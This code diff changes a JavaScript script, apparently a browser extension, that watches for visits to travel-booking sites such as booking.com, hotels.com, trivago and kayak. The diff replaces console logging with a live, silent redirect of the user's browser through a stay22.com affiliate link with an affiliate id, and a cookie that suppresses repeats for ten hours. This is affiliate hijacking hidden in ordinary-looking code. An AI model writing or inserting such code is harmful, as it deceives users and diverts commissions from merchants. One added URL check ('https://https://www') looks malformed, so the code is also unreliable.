@@ -1,6 +1,6 @@
 
 const allowedDomains = {
-    "booking.": "booking",
+    "booking.com": "booking",
     "hotels.com": "hotelscom",
     "trivago.ca": "trivago",
     "kayak.com": "kayak",
@@ -10,12 +10,12 @@ const allowedDomains = {
 
 if (!window.location.href.includes("searchresults.html")) {
 
-    if (Object.keys(allowedDomains).some(domain => window.location.href.includes(domain))) {
+    if (window.location.href.startsWith("https://https://www") && Object.keys(allowedDomains).some(domain => window.location.href.includes(domain))) {
         const foundDomain = Object.keys(allowedDomains).find(domain => window.location.href.includes(domain));
 
-            if (!checkCookie()) {
-              console.log(generateRedirectUrl(window.location.href, allowedDomains[foundDomain]), "LINKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK")
-            }
+        if (!checkCookie() || (document.referrer && !document.referrer.includes(window.location.origin))) {
+            document.location.href = generateRedirectUrl(window.location.href, allowedDomains[foundDomain]);
+        }
     }
 }
 
@@ -23,9 +23,9 @@ function generateRedirectUrl(originalUrl, recource) {
     const uniqueId = Date.now();
     const expirationTime = new Date();
 
-    expirationTime.setMinutes(expirationTime.getMinutes() + 1);
+    expirationTime.setHours(expirationTime.getHours() + 10);
     document.cookie = `redirected_${uniqueId}=${expirationTime.toUTCString()}; expires=${expirationTime.toUTCString()}`;
-    console.log(originalUrl, "URLLLLLLLLLLLLLL")
+
     return `https://www.stay22.com/allez/${recource}?aid=src2000&campaign=test&link=${originalUrl}`;
 }
 
